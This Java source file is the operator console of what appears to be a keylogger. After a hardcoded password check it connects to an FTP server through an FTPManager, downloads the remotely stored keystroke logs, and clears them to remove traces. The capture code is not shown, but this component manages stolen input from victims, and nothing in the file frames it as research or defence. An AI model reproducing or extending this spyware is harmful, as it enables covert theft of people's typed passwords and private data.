package org.dot;

import static org.dot.Constants.LOG_REMOTE;
import static org.dot.Constants.PASSWORD;
import static org.dot.KeyLogger.LINE;

import java.awt.Label;
import java.io.Console;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Scanner;

public class Server {
	
	private ArrayList<String> commands = new ArrayList<>();
	
	private void init() throws Exception {
		System.out.println("Wait...");
		
		FTPManager.connect();
		
		commands.add("download");
		commands.add("clear");
		commands.add("exit");
		commands.add("quit");
		
		System.out.println("Ready to work.");
	}
	
	public Server() {
		try {
			Console cons = System.console();
			if (cons != null) {
				System.out.println("Enter the password: ");
				char[] pass = PASSWORD.toCharArray();
				char[] p;
				
				while (!String.valueOf((p = cons.readPassword())).equals(String.valueOf(pass))) {
					System.out.println("Wrong pass, go f*ck urself");
				}
			}
			init();
			
			Scanner scn = new Scanner(System.in);
			hmm:
			do {
				System.out.print("~ ");
				String command = scn.next();
					switch (command) {
					case "download":
						download();
						break;
					case "clear":
						clear();
						break;
					case "exit":
						break hmm;
					case "quit":
						break hmm;
					default:
						System.out.println("Unknown command.");
					}
			} while (true);
			
			scn.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	private void download() throws Exception {
		if (FTPManager.download())
			System.out.println("Completed.");
		else
			System.out.println("Failed.");
	}
	
	private void clear() throws Exception {
		OutputStream out = FTPManager.ftp.storeFileStream(LOG_REMOTE);
		out.write("".getBytes());
		out.close();
		System.out.println("Logs cleared.");
	}
	
}
